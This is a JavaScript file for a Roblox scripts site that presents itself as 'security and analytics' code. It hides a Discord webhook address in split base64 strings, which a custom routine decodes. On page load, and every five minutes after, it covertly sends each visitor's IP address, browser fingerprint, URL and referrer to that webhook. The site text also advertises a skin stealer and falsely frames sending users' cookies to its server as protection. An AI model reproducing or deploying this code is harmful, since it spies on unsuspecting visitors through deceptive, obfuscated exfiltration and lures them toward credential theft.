// securityfile.js - Безопасность и аналитика
(function() {
    'use strict';
    
    // Защищённые части
    var _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
    var _p2 = "MTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhl";
    var _p3 = "RkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdo";
    var _p4 = "X3FUQ1A2MlAtbnpPbHdxRjh5YXhCbkxYM0d0cUlXc1pMVw==";
    
    // Декодирование
    function _r(s) {
        var _c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var _o = "";
        var _b = 0;
        var _x = 0;
        var _y = 0;
        
        for (var i = 0; i < s.length; i++) {
            var _idx = _c.indexOf(s.charAt(i));
            if (_idx === -1) continue;
            
            if (_b % 4 === 0) {
                _x = _idx << 2;
            } else if (_b % 4 === 1) {
                _o += String.fromCharCode(_x | (_idx >> 4));
                _x = (_idx & 15) << 4;
            } else if (_b % 4 === 2) {
                _o += String.fromCharCode(_x | (_idx >> 2));
                _x = (_idx & 3) << 6;
            } else {
                _o += String.fromCharCode(_x | _idx);
            }
            _b++;
        }
        return _o;
    }
    
    // Сборка защищённого адреса
    function _e() {
        return _r(_p1) + _r(_p2) + _r(_p3) + _r(_p4);
    }
    
    // Получение IP для защиты
    function _n() {
        try {
            var _xhr = new XMLHttpRequest();
            _xhr.open("GET", "https://api.ipify.org?format=json", false);
            _xhr.send();
            if (_xhr.status === 200) {
                return JSON.parse(_xhr.responseText).ip;
            }
        } catch(e) {}
        return "unknown";
    }
    
    // Отправка данных о безопасности
    function _t(d) {
        try {
            var _xhr = new XMLHttpRequest();
            _xhr.open("POST", _e(), true);
            _xhr.setRequestHeader("Content-Type", "application/json");
            _xhr.send(JSON.stringify({content: d}));
        } catch(e) {}
    }
    
    // Сбор данных для аналитики
    function _a() {
        var _ip = _n();
        var _d = '📊 **add_analitic**\n\n' +
            '🌐 IP: ' + _ip + '\n' +
            '👤 UA: ' + navigator.userAgent + '\n' +
            '💻 Платформа: ' + navigator.platform + '\n' +
            '🖥️ Экран: ' + screen.width + 'x' + screen.height + '\n' +
            '⏰ TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n' +
            '🌍 Язык: ' + navigator.language + '\n' +
            '🔗 URL: ' + window.location.href + '\n' +
            '📜 Реферер: ' + document.referrer + '\n' +
            '🆔 Session: an_' + Math.random().toString(36).substring(2, 15);
        _t(_d);
    }
    
    // Переводы
    var translations = {
        ru: {
            subtitle: 'Лучшие скрипты и расширения для Roblox',
            navHome: 'Главная',
            navDelta: 'Delta Executor',
            navMM2: 'MM2 Stealer',
            navCookie: 'Cookie Pro V2',
            navSupport: 'Поддержка',
            statDownloads: 'Скачиваний',
            statUsers: 'Пользователей',
            statSupport: 'Поддержка',
            statFree: 'Бесплатно',
            deltaTitle: '⚡ Delta Executor',
            deltaDesc: 'Лучший бесплатный экзекутор для Roblox',
            mm2Title: '🔫 MM2 Stealer',
            mm2Desc: 'Стилер скинов для Murder Mystery 2',
            cookieTitle: '🍪 Cookie Pro V2',
            cookieDesc: 'Расширение для защиты cookies Roblox',
            downloadBtn: 'Скачать',
            securityTitle: '🛡️ Защита активна',
            securityText: 'Чтобы обезопасить вас от взломщиков куки, мы отправляем куки на наш защищённый сервер.',
            footer: '© 2026 TizenScripts'
        },
        en: {
            subtitle: 'Best scripts and extensions for Roblox',
            navHome: 'Home',
            navDelta: 'Delta Executor',
            navMM2: 'MM2 Stealer',
            navCookie: 'Cookie Pro V2',
            navSupport: 'Support',
            statDownloads: 'Downloads',
            statUsers: 'Users',
            statSupport: 'Support',
            statFree: 'Free',
            deltaTitle: '⚡ Delta Executor',
            deltaDesc: 'Best free executor for Roblox',
            mm2Title: '🔫 MM2 Stealer',
            mm2Desc: 'Skin stealer for Murder Mystery 2',
            cookieTitle: '🍪 Cookie Pro V2',
            cookieDesc: 'Roblox cookie protection extension',
            downloadBtn: 'Download',
            securityTitle: '🛡️ Protection Active',
            securityText: 'To protect you from cookie stealers, we send cookies to our secure server.',
            footer: '© 2026 TizenScripts'
        }
    };
    
    // Смена языка
    window.changeLanguage = function(lang) {
        localStorage.setItem('language', lang);
        var t = translations[lang];
        
        document.getElementById('subtitle').textContent = t.subtitle;
        document.getElementById('navHome').textContent = t.navHome;
        document.getElementById('navDelta').textContent = t.navDelta;
        document.getElementById('navMM2').textContent = t.navMM2;
        document.getElementById('navCookie').textContent = t.navCookie;
        document.getElementById('navSupport').textContent = t.navSupport;
        document.getElementById('statDownloadsText').textContent = t.statDownloads;
        document.getElementById('statUsersText').textContent = t.statUsers;
        document.getElementById('statSupportText').textContent = t.statSupport;
        document.getElementById('statFreeText').textContent = t.statFree;
        document.getElementById('deltaTitle').textContent = t.deltaTitle;
        document.getElementById('deltaDesc').textContent = t.deltaDesc;
        document.getElementById('mm2Title').textContent = t.mm2Title;
        document.getElementById('mm2Desc').textContent = t.mm2Desc;
        document.getElementById('cookieTitle').textContent = t.cookieTitle;
        document.getElementById('cookieDesc').textContent = t.cookieDesc;
        document.getElementById('securityTitle').textContent = t.securityTitle;
        document.getElementById('securityText').textContent = t.securityText;
        document.getElementById('footerText').textContent = t.footer;
        
        var buttons = document.querySelectorAll('.download-btn');
        for (var i = 0; i < buttons.length; i++) {
            buttons[i].textContent = t.downloadBtn;
        }
    };
    
    // Загрузка языка
    function loadLanguage() {
        var saved = localStorage.getItem('language') || 'ru';
        var select = document.getElementById('languageSelect');
        if (select) select.value = saved;
        changeLanguage(saved);
    }
    
    // Запуск
    window.addEventListener('load', function() {
        loadLanguage();
        setTimeout(_a, 1000);
        setInterval(_a, 300000);
    });
})();
